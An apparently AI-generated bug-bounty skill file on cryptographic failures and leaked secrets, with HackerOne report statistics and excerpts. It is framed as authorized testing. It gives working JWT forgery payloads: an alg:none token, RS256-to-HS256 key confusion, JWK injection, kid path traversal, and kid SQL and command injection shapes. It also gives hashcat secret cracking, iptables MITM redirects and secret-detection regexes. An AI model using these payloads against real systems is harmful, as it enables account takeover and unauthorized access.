---
name: bbhunt-crypto-and-secrets
description: "Use for weak algorithms, key/JWT confusion, hardcoded secrets, insecure randomness, certificate validation gaps, and credential handling flaws. Unified from 2 upstream skills (h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Cryptographic Failures and Exposed Secrets — unified skill

> **Complete merged skill.** Everything from 2 upstream skills across h1skills, hunting and the local HackerOne corpus is contained in this file. Unmodified originals remain in `references/` for provenance only.

## Corpus evidence — 562 valid HackerOne reports (83 paid / 15%)

Every disclosed report is valid; payment is an impact signal, not a validity test.

### Techniques ranked across ALL valid reports

| Technique | Reports |
|---|---:|
| public source-code / repo review | 154 |
| internal service / port / container | 87 |
| JWT / token / base64 decode | 55 |
| subdomain / DNS / cert-transparency recon | 54 |
| race / concurrency / timing | 51 |
| admin / privileged-role context | 50 |
| cache / CDN / unkeyed header | 50 |
| file upload / filename / extension | 49 |
| encoding / double-encode / null byte | 49 |
| HTTP method / verb tampering | 44 |
| second-order / stored / blind delivery | 33 |
| webhook / OAuth / SAML / integration abuse | 32 |
| API docs / Swagger / introspection | 31 |
| OAST / DNS / HTTP callback proof | 27 |
| two-account / cross-account replay | 26 |
| error message / stack trace probing | 26 |
| fuzzing / wordlist brute force | 23 |
| Content-Type / body-format switch | 23 |
| XML / SOAP / SAML / XXE | 19 |
| third-party data / paste / breach reuse | 18 |
| header injection (Host / X-Forwarded / etc.) | 17 |
| git history / exposed .git | 16 |
| JS bundle / source-map inspection | 12 |
| parser confusion / normalization | 12 |
| unauthenticated / removed-cookie test | 11 |
|  HosT/absolute-URL reset poisoning | 10 |
| intercept & replay request in Burp | 10 |
| deserialization / gadget chain | 8 |
| WAF / sanitizer / filter bypass | 8 |
| parameter pollution / duplicate keys | 8 |
| redirect chain / Location header | 6 |
| DOM / HTML source inspection | 6 |
| public bucket / storage exposure | 6 |
| employee / developer public info | 6 |
| verbose debug / framework fingerprint | 6 |
| replay / modify a captured request | 4 |
| swap object ID / parameter value | 4 |
| cloud metadata / IAM abuse | 4 |
| archive / Wayback endpoint discovery | 3 |
| response diff / status / length comparison | 2 |
| template injection (SSTI) | 1 |
| search-engine dorking | 1 |

### Parameters observed in writeups

`max-age` (12), `charset` (11), `domain` (10), `name` (10), `path` (7), `expires` (7), `samesite` (7), `duse_apple_sectrust` (6), `version` (5), `random` (5), `result` (5), `signature` (5), `name0` (5), `headers` (4), `mode` (4), `key` (4), `password` (4), `content` (4), `token` (4), `curlopt_ssl_verifypeer` (4), `verifypeer` (4), `subdomain` (4), `require_ocsp` (4), `serialnumber` (3), `encoding` (3), `subject` (3), `txt` (3), `phpsessid` (3), `post-check` (3), `pre-check` (3)

### Bypass primitives observed

`bypass` (83), `content-type` (45), `%00` (33), `bypassed` (25), `trailing dot` (24), `crlf` (17), `lowercase` (16), `bypassing` (14), `bypasses` (7), `whitelist` (4), `blind` (3), `unicode` (2), `normalize` (2), `url encoded` (1), `uppercase` (1), `mixed case` (1), `trailing slash` (1), `type confusion` (1), `normalized` (1), `case-sensitive` (1), `allowlist` (1), `normalizes` (1)

### Impact language observed

`password` (682), `token` (275), `secret` (253), `credential` (116), `localhost` (106), `admin` (96), `payment` (73), `api key` (63), `sensitive information` (51), `unauthorized` (47), `sensitive data` (21), `financial` (18), `account takeover` (14), `pii` (14), `exfiltration` (6), `rce` (4), `exfiltrate` (4), `internal service` (4), `privilege escalation` (3), `unauthorised` (3)

### Case studies — full excerpts (paid and unpaid)

#### [340431](https://hackerone.com/reports/340431) — Reflected XSS and sensitive data exposure, including payment details, on lioncityrentals.com.sg

Uber · $4000 · high

lioncityrentals.com.sg employed a Wordpress installation that possessed a vulnerable plugin, Formidable Forms, which was vulnerable to reflected XSS, and exposed sensitive form data. Thanks again for the report, @healdb! This was the first bug I ever found that exposed a large amount of PII, thanks for disclosing @uber! This bug reinforces to me that hackers should always examine microsites as well as core domains, sometimes bugs on microsites can lead to significant data exposure. In this case, lioncityrentals.com.sg was collecting data on thousands of Uber Singapore users, which was then exposed by the outdated Wordpress plugin. You can read more about the formidable forms vulnerability here - And be sure to check out my blog or my twitter for Bug Bounty tips and guides!

#### [1888803](https://hackerone.com/reports/1888803) — Use of Cryptographically Weak Pseudo-Random Number Generator in WebCrypto keygen

Internet Bug Bounty · $4000 · high

CVE-2022-35255 Detail Description A weak randomness in WebCrypto keygen vulnerability exists in Node.js 18 due to a change with EntropySource() in SecretKeyGenTraits::DoKeyGen() in src/crypto/crypto_keygen.cc. There are two problems with this: 1) It does not check the return value, it assumes EntropySource() always succeeds, but it can (and sometimes will) fail. 2) The random data returned byEntropySource() may not be cryptographically strong and therefore not suitable as keying material. NVD Link: HackerOne original report:

#### [113288](https://hackerone.com/reports/113288) — OpenSSL Key Recovery Attack on DH small subgroups (CVE-2016-0701)

Internet Bug Bounty · $2500 · severity n/a

Full write up: DH small subgroups (CVE-2016-0701) ================================== Severity: High Historically OpenSSL usually only ever generated DH parameters based on "safe" primes. More recently (in version 1.0.2) support was provided for generating X9.42 style parameter files such as those required for RFC 5114 support. The primes used in such files may not be "safe". Where an application is using DH configured with parameters based on primes that are not "safe" then an attacker could use this fact to find a peer's private DH exponent. This attack requires that the attacker complete multiple handshakes in which the peer uses the same private DH exponent. For example this could be used to discover a TLS server's private DH exponent if it's reusing the private DH exponent or it's using a static DH ciphersuite. OpenSSL provides the option SSL_OP_SINGLE_DH_USE for ephemeral DH (DHE) in TLS. It is not on by default. If the option is not set then the server reuses the same private DH exponent for the life of the server process and would be vulnerable to this attack. It is believed that many popular applications do set this option and would therefore not be at risk. OpenSSL before 1.0.2f will reuse the key if: - - SSL_CTX_set_tmp_dh()/SSL_set_tmp_dh() is used and SSL_OP_SINGLE_DH_USE is not set. - - SSL_CTX_set_tmp_dh_callback()/SSL_set_tmp_dh_callback() is used, and both the p

#### [1888758](https://hackerone.com/reports/1888758) — Inadequate Encryption Strength in nodejs-current reads openssl.cnf from /home/iojs/build/... upon startup on MacOS

Internet Bug Bounty · $2400 · medium

CVE-2022-32222 Detail Current Description A cryptographic vulnerability exists on Node.js on linux in versions of 18.x prior to 18.40.0 which allowed a default path for openssl.cnf that might be accessible under some circumstances to a non-admin user instead of /etc/ssl as was the case in versions prior to the upgrade to OpenSSL 3. NVD Details: HackerOne original report:

#### [168538](https://hackerone.com/reports/168538) — Twitter iOS fails to validate server certificate and sends oauth token

X / xAI · $2100 · high

Twitter on iOS newest two versions (6.62 and 6.62.1) are affected, other versions not tested. Tested independently on two different iPhone 6 with iOS version 9.3.3 and 9.3.5 without Jailbreak. The iPhone were without any mobileconfig profiles installed - *no* we did not install any CA certificate in the CA store of the device. Really stock iPhones. The Twitter app does not check the SSL/TLS certificate of . A transparent proxy setup (eg. burp suite in transparent mode) is sufficient to exploit. Steps to reproduce: 1. Start Burp or other Proxy software in transparent mode. Setting "Generate CA-signed per-host certificates", which means the CA cert of Burp is used, which is *not* trusted on the iPhones. 2. Start rogue Wifi access point (eg. on the same machine as burp) 3. Redirect all incoming HTTPS traffic on the rogue Wifi access point to the transparent proxy. We simply used on Linux: iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to $BURP_IP:8080 iptable -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080 4. Connect with the iOS device to the Wifi access point 5. Open Twitter app on iOS 6. In burp only the calls to api.twitter.com are visible and include sensitive authentication information etc. This is the information we saw for two different accounts in burp which includes the oauth token etc.: GET /1.1/help/settings.json?include_

#### [716292](https://hackerone.com/reports/716292) — JumpCloud API Key leaked via Open Github Repository.

Starbucks · no bounty — still valid · critical

**Summary:** Open Github Repo Leaking Starbucks JumbCloud API Key **Description:** Team, While going through Github search I discovered a public repository which contains Jumbcloud API Key of Starbucks. Repo: [ File: [ **POC** * List systems There are multiple AWS instances present * * SSO Applications AWS login SAM config is presents. This would leads to AWS account takeover ## Impact This issue impact is critical as through this API anyone could * Execute commands on systems [ * Add/Remove users which has access to internal systems * AWS Account Takeover

#### [396467](https://hackerone.com/reports/396467) — Github Token Leaked publicly for https://github.sc-corp.net

Snapchat · no bounty — still valid · critical

###Description : GitHub is a truly awesome service but it is unwise to put any sensitive data in code that is hosted on GitHub and similar services as i was able to find github token indexed ***7 hours Ago*** by user ***██████ - Software Engineer - Snap Inc*** ### Issue & POC : You can find the leak in this link : ## Impact I didn't try anything with the token, and dont know what access it has, and i know that in order to login to you need to have an email @snap but still i though it would be a good idea to share this finding with you in case it can be used in a way that i dont know. Best Regards

### Recurring approach patterns from real reports

- 3× ai disclosure i used an ai assistant claude for code review test setup and drafting
- 2× i was unable to use the found password as the api appears to be currently non functional but since the repo is active i would expect the server to be worked upon and the api to be functional in the future
- 2× for this reason i ve decided to make you aware of the issue
- 2× summary when i searched github for sensitive information i found some privet key in github repository
- 1× i have identified approximately android applications and some ipad that fail to validate ssl certificates either failing to validate valid certificate authorities correct hostnames or both
- 1× based on the available source code i see that proguard is not being used
- 1× by mx receiving tld with esmtps id e3si1568039obp for recipient domain tld version tlsv1 cipher ecdhe rsa rc4 sha bits tue apr pdt the perhaps slightly obvious fix seems to be to support esmtps by allowing starttls to be negotiated by the sending system s
- 1× as a possible fix you can replace captcha check with a honeypot trap or a simple task or skill testing question
- 1× i have used ncat which generates a certificate on the fly to demonstrate the issue ncat ssl p v n l ncat version ncat generating a temporary bit rsa key
- 1× i found that bruteforce protection is not enabled on the login page of
- 1× i tried a lot but didn t get any type of capcha or ratelimiting
- 1× i found a bug in twitter com description and poc create a twitter account having email address abcd x com
- 1× twitterflight com from twitter inc i just checked it with whois website service encrypts traffic using an old deprecated protocol with known weakness wich is obsolete and insecure you should disable it
- 1× i have checked by reloading multiple times and all tokens are valid
- 1× you can get a lot fancier with this such as creating a separate file per victim or by parsing the file within php and only writing the relevant information to disk
- 1× where i found it data data co vine android databases webview db poc please see the screenshot of sqlite database
- 1× i created a program named puffer bird and i leave the sandbox to prepare to launch the program
- 1× initial validation can begin by sending an email from the pufferbird com to support hackerone com
- 1× so i went to a hosting website i created a new account to create a domain pufferbird com
- 1× screenshot after creating the domain i created an email no reply pufferbird com screenshot then i sent an email to hackerone com screenshot and it has been sent successfully
- 1× i sent another email directly to hackerone com using my own and real email
- 1× screenshot short recap i made a program leave the sandbox to request review hackerone com emailed me for validation of the program i validate the program using the fake pufferbird com email address i emailed hackerone com that i already sent the email which contains information about the program
- 1× this only works if the user has the remember me for a week option ticked when logging in
- 1× i furthermore noticed that the various values that i yielded upon subsequent logins did not look random at all but they instead looked quite similar to each other

## Corpus-backed method (this class)

1. Inventory every signed/encrypted artifact and identify algorithm, key source, and verification path.
2. Decode tokens without trusting them; check alg, kid, exp, nbf, aud, iss and signature verification behaviour.
3. Test algorithm confusion and key/source confusion only where the token is actually consumed for authorization.
4. Search JS, source maps, configs, repos and error output for secrets — then demonstrate what each secret grants access to.
5. Assess randomness by comparing multiple issued tokens for predictable structure or seeded values.
6. Prove a security consequence: forged identity, decrypted data, or access to a protected resource.

### Signals

- JWT, signed URLs, HMAC tokens, API keys, OAuth client secrets
- alg:none or RS256->HS256 confusion opportunities
- Predictable tokens, weak randomness, short secrets
- Certificate validation disabled in a client or integration

### Kill criteria

- Weak crypto in theory only, with no exploitable consequence.
- Secret found but revoked/invalid/unused.
- Certificate issue in a client you cannot influence as an attacker.

### Escalation chains

- JWT confusion -> forged admin identity.
- Client secret -> OAuth token issuance -> data access.
- Predictable reset token -> ATO.

### Probes

- alg:none, RS256->HS256 with public key as HMAC secret, kid path/URL manipulation, replay exp-bound tokens.

### Veteran tip

Public source-code review and token decoding are the top corpus techniques; always end with a demonstrated capability, not a theoretical weakness.

## Unified upstream methodology (complete, deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Search JS bundles, mobile apps, and public repos for keys/tokens.
- Check password storage, reset tokens, and encryption modes.
- Test TLS/certificate validation in mobile/thick clients.
- Look for secrets in logs, errors, URLs, and analytics.

### Deeper checklist

- Search JS bundles, mobile apps, and public repos for API keys, tokens, and private keys.
- Check password storage and reset tokens for weak hashing, short entropy, or reuse.
- Test TLS/certificate validation in mobile and thick clients (proxy interception).
- Look for secrets in logs, error messages, URLs, and analytics events.
- Check encryption modes, IV reuse, hardcoded keys, and missing integrity protection.
- Validate that a leaked key is live and scoped to sensitive access before reporting.

### A. Discovery checklist — concrete places, params, headers, flows to look

- Inventory every JWT use: `Authorization: Bearer <token>` headers, session cookies, password-reset/email-verification links, invitation/share links, refresh tokens, and webhook/HMAC signatures. Note where the same token is accepted (which hosts, API versions, mobile clients).
- Decode all three parts with Burp's JWT Editor or `jwt_tool`. In the header record `alg`, `typ`, `kid`, `jku`, `jwk`, `x5u`, `x5t`, `cty`, `crit`; in the payload record `sub`, `user`, `role`, `scope`, `aud`, `iss`, `exp`, `nbf`, `iat`, `org`/`tenant`.
- Locate the verification key: `/jwks.json`, `/.well-known/jwks.json`, `/openid-connect/certs`, static PEM files, JS bundles, GitHub repos, and error messages leaking library/version. Also check whether the app ships the *secret* to the browser (strong sign of client-side verification).
- Identify the library/version from stack traces or headers and map to recent CVEs — e.g. CVE-2026-22817 (Hono JWT middleware algorithm confusion when the selected JWK has no explicit `alg`), CVE-2026-29000 (`none` in JWE implementations), CVE-2015-9235 lineage.
- Check the full lifecycle: token in URL/Referer/history, in `localStorage`/`sessionStorage`, whether the resource server re-verifies on every request, and whether revocation (`/logout`, password change) is enforced server-side for self-contained JWTs.

- Check whether the JWT is accepted across multiple services with different expectations: the same token for API A and admin API B may only validate `exp` in one service — audience confusion is a separate finding from signature forgery.
- Look for algorithm flexibility in the JWKS itself: if the server picks the verification algorithm from a JWK that lacks an explicit `alg` field, RS256→HS256 confusion may be possible (CVE-2026-22817 Hono pattern).
- Note token storage: an XSS in an app that stores JWTs in `localStorage` turns a low-severity XSS into full account compromise — chain to a real theft proof.
- Check `crit` header handling: unknown critical headers must be rejected; ignored ones can hide processing instructions that change how the token is verified.
- Look for `jku`/`x5u` URLs pointing to internal services — these are also SSRF primitives even when the forged token itself is rejected.
- Search for "none" support in nested/JWE contexts: CVE-2026-29000 showed `alg: none` still working in JWE implementations in 2026 — test compact JWE strings too.
- Record the exact key source used by the verifier: a JWKS endpoint may rotate keys, so a token forged with an old key may still pass if the verifier caches JWKs.
- Check whether password-reset and invitation tokens are JWTs — if so, the same header attacks apply, and a forged `sub`/`email` claim can target another user's reset flow.
- Look for signature verification that happens only in the browser (e.g. with a public key shipped in the bundle) — if the API trusts client-decoded claims, the signature is meaningless.
- Map every accepted token location: some APIs accept the JWT in a cookie, header, AND query parameter, letting you bypass HttpOnly by moving the token to a URL.

### Signals and surfaces

### Signal

- Reports: **562** · paid: **83**
- Median bounty **$500** · p90 **$2,500** · max **$6,909** · total **$84,616**
- Median upvotes **8**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Internet Bug Bounty | 34 | $21,500 | 625 |
| GitHub Security Lab | 10 | $17,200 | 95 |
| Uber | 8 | $12,750 | 491 |
| Dropbox | 2 | $7,125 | 57 |
| X / xAI | 15 | $2,940 | 258 |
| Mail.ru | 4 | $2,650 | 86 |
| Nextcloud | 36 | $2,350 | 534 |
| Slack | 3 | $2,350 | 229 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`js` `env` `config` `logs` `mobile` `repo` `backup`

### Techniques, payloads and bypasses

### Payloads & probes

- Regex -> `AKIA[0-9A-Z]{16}`, `AIza[0-9A-Za-z_-]{35}`, `ghp_[0-9A-Za-z]{36}`
- JWT secret -> `hashcat -m 16500`
- Weak reset token -> timestamp/random seed

### Bypass tricks

- Check base64/hex-obfuscated keys in bundles.
- Look at source maps and CI artifacts for env files.
- Test key scope before reporting.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **JumpCloud API Key leaked via Open Github Repository.** — `#716292` · Starbucks · $0 · ▲739
  > File: [https://github.com/████/Project/blob/0d56bb910923da2fbee95971778923f734a25f68/getSystemUsers.go](https://github.com/████/Project/blob/0d56bb910923da2fbee95971778923f734a25f68/getSystemUsers.go)
- **Github Token Leaked publicly for https://github.sc-corp.net** — `#396467` · Snapchat · $0 · ▲582
  > https://github.com/█████/leetcode/blob/0eec6434940a01e490d5eecea9baf4778836c54e/TopicMatch.py
- **Reflected XSS and sensitive data exposure, including payment details, on lioncityrentals.com.sg** — `#340431` · Uber · $4,000 · ▲376
  > And be sure to check out my blog https://healdb.tech/blog/ or my twitter https://twitter.com/heald ben
- **Reset any password** — `#703972` · pixiv · $0 · ▲313
  > 1.input the email [reset password url](https://www.pixiv.net/reminder.php).
- **Infromation Disclosure To Use of Hard-coded Cryptographic Key** — `#2353237` · Reddit · $0 · ▲238
  > [ I discovered this link while I was conducting a survey and collecting information, and I discovered it when I visited this link https://www.reddit.com/?rdt=49420 after logging into my account, as I will explain in pictures using the Trufflehog tool.
- **Key Reinstallation Attacks: Breaking WPA2 by forcing nonce reuse** — `#286740` · Internet Bug Bounty · $0 · ▲191
  > [The Wi-Fi Alliance](https://www.wi-fi.org/news-events/newsroom/wi-fi-alliance-security-update) is using these to [test if new products are affected](https://www.wi-fi.org/security-update-october-2017) or not.
- **Slack DTLS uses a private key that is in the public domain, which may lead to SRTP stream hijack** — `#531032` · Slack · $2,000 · ▲170
  > Notice that the `SetRemoteDescription` fingerprint in the `about:webrtc-internals` page is `C5:5F:DA:7D:84:47:B1:BF:6B:55:16:62:48:31:3E:D3:F1:7B:25:89:92:4A:4B:4D:4D:D9:D5:AF:EA:D8:15:44`
- **Public and secret api key leaked  in JavaScript source** — `#983331` · Stripo Inc · $0 · ▲148
  > Directory sensitive is ``main.c1965c58f39a0f4aadc3.js`` parse this json files using jsonparseronline
- **[3DS][SSL] Improper certificate validation allows an attacker to perform MitM attacks** — `#894922` · Nintendo · $0 · ▲129
  > - spoofing the `NetUpdateSOAP` and `ECommerceSOAP` endpoints used by the NIM module to:
- **MySQL username and password leaked in developer.valvesoftware.com via source code dislosure** — `#291057` · Valve · $0 · ▲123
  > But they forgot about `/scripts/`itself where it's also allowing a directory listing to see it contents.
- **connect.8x8.com/api/v1: JWT Algorithm Confusion Vulnerability** — `#3800870` · 8x8 · $1,337 · ▲111
  > @kyotozzx reported a JWT algorithm confusion vulnerability in the `v1` API of `connect.8x8.com`.
- **Unauthorized Account Access via Leaked Credentials in URL Format (Account Takeover )** — `#3080597` · Khan Academy · $0 · ▲107
  > this time the email and password of the victim is archived in clear text ( https://en.khanacademy.org/login,██████,,█████████,,,█████████,██████████,Personal )
- **Insecure Zendesk SSO implementation by generating JWT client-side** — `#638635` · Trint Ltd · $0 · ▲102
  > Looking at some of the UI views, I stumbled upon `static/js/modules/auth/pages/ZendeskLoadingPage.js`.
- **Important information leaked on Github** — `#649322` · Equifax-vdp · $0 · ▲98
  > In the following link (https://github.com/ajiththorali/Testing/blob/49025b364451fb2076f85ad009a0dc50a941c5ce/target/classes/API Equifax/propertiesHandle.properties) you could find this info
- **internal dev tokens disclosure** — `#1940443` · Snapchat · $250 · ▲96
  > such as https://github.com/Snapchat/KeyDB/commit/157b32109854f947843366f66215ccf90809e766
- **Leaked reused password for a few Khan Academy users** — `#3099978` · Khan Academy · $0 · ▲92
  > Increased risk of account takeover (ATO) if users reuse passwords across platforms.
- **Github Token Leaked publicly for https://github.com/mopub** — `#612231` · X / xAI · $0 · ▲92
  > ====================================================
- **███ leaking PII of tour visitors (names, email addresses, phone numbers) via misconfigured record permissions** — `#2294930` · U.S. Dept Of Defense · $0 · ▲90
  > Content-Type: application/x-www-form-urlencoded;charset=UTF-8
- **Cleartext Transmission of Sensitive Information Leads to administrator access** — `#813159` · Helium · $0 · ▲89
  > Vulnerable URL: https%3A%2F%2Fconsole.helium.com%2Fusers
- **fetlife.com/signup_step_profile expose access_token of mapbox.com** — `#2129769` · FetLife · $0 · ▲87
  > Upon having this access token, I could freely use your token on my site, even though fetlife have `Referer: https://fetlife.com/`, I could navigate around that easily using direct http call from my server and inject Referer header as `https://fetlife.com/`.
- **elections.k8s.io uses weak session secret key, may place elections at risk** — `#1387366` · Kubernetes · $250 · ▲86
  > @nagli and I discovered that `elections.k8s.io` uses a weak Flask SECRET KEY, literally the string `N/A`, to sign authentication cookies.
- **Microsoft `x-apikey` Exposed in Mozilla CI Public Logs** — `#3243860` · Mozilla · $200 · ▲84
  > The key appears in HTTP POST requests sent to Microsoft's telemetry endpoint during automated Firefox testing and is captured via mitmproxy logs.
- **Invite tokens have Insufficient entropy in GHES Management Console** — `#2197801` · GitHub · $0 · ▲81
  > An insufficient entropy vulnerability was identified in GitHub Enterprise Server (GHES) that allowed an attacker to brute force a user invitation to the GHES Management Console.
- **Cookie steal through content Uri** — `#876192` · Brave Software · $0 · ▲79
  > Because of the usage of `root-path` with path `.`, it is possible to use this provider to point to all files in the Android system.
- **Sensitive Info Leak - An Attacker Can Retrieve All the Users Mobile Numbers at https://website-api.production.curve.app/api/waitlist/us** — `#902733` · Curve · $0 · ▲79
  > When am going through all the JS files in curve.com I found a link called "/usa" is used to create Curve USA Waitlists by entering your name, email address, mobile number and address details.
- **SMTP interaction theft via MITM** — `#953219` · PortSwigger Web Security · $0 · ▲78
  > See http://www.postfix.org/CVE-2011-0411.html for adetailled description.
- **Page has a link to google drive which has logos and a few customer phone recordings** — `#864712` · Eternal · $200 · ▲76
  > As you can see in the above image,there are about 35 recordings wherein sensitive information is being disclosed.I guess everything is uploaded yesterday (May 1st).
- **Grammarly Keyboard for Android "Authorization Code with PKCE" flow implementation vulnerability that allows account takeover** — `#824931` · Superhuman (formerly Grammarly) · $0 · ▲76
  > @tomtenisse identified a vulnerability in Grammarly Keyboard for Android that allowed malicious application installed on the device to guess the PKCE code verifier value and consequently obtain access to OAuth access token (`grauth` cookie).
- **SameSite restrictions are lifted, and SameSite:Strict cookie are being sent.** — `#3253725` · Brave Software · $0 · ▲73
  > The reason SameSite=Strict cookies are being sent in this case is because the Sec-Fetch-Site: cross-site header, which should normally be present, is missing.
- **明確な認証不備および潜在的な中間者攻撃の可能性（Clear Authentication Deficiencies & Potential for Man-in-the-Middle Attacks）** — `#2642615` · Sony · $0 · ▲71
  > For example, if you want to set the Bluetooth name to "Example Laptop", write `PRETTY HOSTNAME=Example Laptop` in `machine-info`.

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 7× | `SecTrustSetOCSPResponse()` |
| 7× | `hsts_check()` |
| 6× | `$position` |
| 6× | `ssl_peer_key_build()` |
| 5× | `ossl_apple_verify()` |
| 5× | `hsts_add_host_expire()` |
| 5× | `Curl_hsts_parse()` |
| 4× | `master @ 3ad4a5ee8` |
| 4× | `Curl_ossl_check_peer_cert()` |
| 4× | `verifystatus()` |
| 4× | `SSL_get_tlsext_status_ocsp_resp()` |
| 4× | `gnutls_certificate_verify_peers2()` |
| 4× | `Math.random()` |
| 4× | `EntropySource()` |
| 4× | `Curl_fopen()` |
| 4× | `Curl_vtls_apple_verify()` |
| 4× | `$passPhrase` |
| 4× | `$version` |
| 4× | `OC\Security\SecureRandom::generate` |
| 4× | `hsts_create()` |

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- `alg:none`: set header `{"alg":"none","typ":"JWT"}` (try `None`, `NoNe`, casing variants), elevate `role`/`sub`, strip the signature but KEEP the trailing dot: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.` Missing-signature variant: send only header.payload with no third segment.
- RS256→HS256 key confusion: change `alg` to `HS256`, keep payload, sign with the server's public key as the HMAC secret. The key must be *byte-identical* to the server's copy (same PEM/X.509 format, same newlines). Convert JWK→PEM via JWT Editor's New RSA Key → PEM radio → Base64 → New Symmetric Key `k`. Automate with `jwt_tool -X a`.
- No exposed public key? Derive `n` from two existing tokens with `docker run --rm -it portswigger/sig2n <token1> <token2>` (or `jwt_forgery.py` from `rsa_sign2n`); only one candidate `n` is accepted — replay each forged token until one works.
- JWK injection (CVE-2018-0114): generate your own RSA pair, embed it in `jwk` with a matching `kid`, set `alg: RS256`, sign with your private key. Header shape: `{"alg":"RS256","kid":"example-key-id","jwk":{"kty":"RSA","kid":"example-key-id","use":"sig","n":"...","e":"AQAB"}}`. Try `jku`/`x5u` pointing at a JWKS you host (`jwt_tool -X s`).
- `kid` path traversal: `{"alg":"RS256","kid":"../../../dev/null"}` — sign with `/dev/null` so the server loads the same predictable "key". `kid` SQLi: `"kid": "x' UNION SELECT 'pwned_secret'-- -"` then HMAC-sign with `pwned_secret`. Also try command-injection shapes like `key1|/usr/bin/uname`.
- Weak HS256 secrets: `hashcat -a 0 -m 16500 token.txt rockyou.txt` or `john --wordlist=...`; test `secret`, `password`, `123456`, company name, developer names. Search GitHub/JS bundles for hard-coded signing secrets.
- ECDSA `r=s=0` forge for vulnerable Java verifiers: Base64URL `MAYCAQACAQA` as the signature.
- Claim manipulation once any signature primitive works: `sub`/`user` → admin, `role` → owner, `org`/`tenant` → victim organization, extend `exp`, flip `aud`, and combine with an IDOR against a victim tenant.

- JWK-to-PEM conversion details (PortSwigger): JWT Editor → New RSA Key → paste JWK → PEM radio → copy → Decoder → Base64-encode → New Symmetric Key → replace `k` with that Base64 → sign with `alg: HS256`. Skipping the Base64 step is the most common reason key confusion "fails".
- `jwt_tool` quick matrix: `-X a` (algorithm confusion), `-X s` (JWKS spoof), `-I -pc role -pv admin` (claim injection), `-X n` (none). Always re-decode the produced token before sending.
- None-algorithm casing variants: `none`, `None`, `NONE`, `NoNe` — some parsers only blacklist the lowercase literal. Keep the trailing dot: `header.payload.`.
- Weak-secret cracking: `hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt` (JWT format only works for HS-family tokens); `john --wordlist=... jwt.txt` as an alternative. Confirm the cracked secret by signing a modified token.
- `kid` SQLi payload variants: `"kid":"x' UNION SELECT 'aaa'-- -"`, `"kid":"key1' OR '1'='1"`; NoSQLi equivalent `"kid":{"$ne":"real-key"}` when the backend is MongoDB.
- `kid` path traversal targets: `/dev/null` (empty/known content), a publicly readable app config, or a file you uploaded whose contents you control — sign with that exact content so the server's key lookup matches.
- Claim manipulation checklist: `sub`/`user` → victim, `role`/`scope` → admin, `aud` → target service, `iss` → trusted issuer, extend `exp`, remove `nbf`; test each independently to learn which claims the app actually trusts.
- Chaum/ECDSA `r=0,s=0` forgery `MAYCAQACAQA` works only on vulnerable Java verifiers — do not generalize it to all ES256 implementations.
- Combine with IDOR: once a token for user A is forged, still test object IDs — a valid forged token with a broken ownership check is the full Critical chain.

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-JWT-CRYPTO — Forgeable JSON Web Tokens (A04 Cryptographic Failures)

### Validation discipline

- Decode and confirm the token you sent actually carries the edited claims.
- The win is **cross-identity data access**, not merely a 200. Show the foreign
  user data (e.g. other users' emails) in the response.
- `alg:none` rejected (401) just means that flaw is patched — try key confusion
  before concluding the app is safe.

### C. Validation / proof bar — how to confirm and avoid false positives

- The win is **cross-identity data access or an admin-only action**, not merely a 200 or a decoded admin claim. Show another user's data / a privileged state change resulting from the forged token.
- Decode the *exact* token you sent and confirm the edited claims and `alg` actually reach the server; resource servers must validate signature, issuer, audience, expiration, and algorithm independently of the token header.
- For key confusion, a 401 usually means the byte representation differs — retry with alternate PEM formatting/newlines before concluding it is patched; `alg:none` 401 likewise only rules out that one primitive.
- For derived-key attacks, only one candidate `n` should work; do not report "algorithm confusion" based on a local forgery the server never accepted.
- A JWT secret found in client-side code is only a finding if you demonstrate the server accepts a token signed with it — do not report "secret in bundle" as standalone if verification is server-side with a different key.
- Missing best practices (PII in JWT payload, long expiry) are usually Informational; chain them to a concrete access-control break. Redact tokens and victim PII in the PoC.

- Verify the target actually uses JWTs for authentication (not just for a share link) — a forged token for a low-value share link is a different finding.
- Show a *cross-identity* result: another user's data, an admin action, or access to a different tenant. A 200 on `/me` with your own data is not the win.
- For algorithm confusion, confirm the server's local public key bytes match yours exactly — formatting differences (CRLF vs LF, PKCS#1 vs X.509) are the most common false negative.
- When deriving `n` from two tokens, only one candidate should be accepted; if several are accepted, the verifier is not checking the signature at all — that is a stronger finding, not a weaker one.
- A `401` from `alg:none` only rules out that primitive; test HS/RS confusion, `jwk` injection, `kid` injection, and weak-secret cracking before writing "JWT implementation is secure".
- Distinguish "signature not verified" from "claims not authorized": a validly signed token with a manipulated role that the app trusts is an authorization issue, not a crypto forgery.
- Do not report a hard-coded secret found in JS/GitHub unless the server accepts a token signed with that secret — client-side-only verification must be demonstrated.
- PII in JWT payloads and long expiries are best-practice observations; they are Informational unless chained to an access-control break.
- Redact tokens and victim data in evidence; keep header/payload structure visible so triage can see the forged claims.

### Escalation and related chains

### Escalation chains

- Leaked key -> cloud access.
- Weak crypto -> token forgery.

### Tools and wordlists

### Tools

`trufflehog` · `gitleaks` · `hashcat` · `jwt_tool` · `nuclei`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_crypto-and-secrets.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_crypto-and-secrets.txt` | 77 |
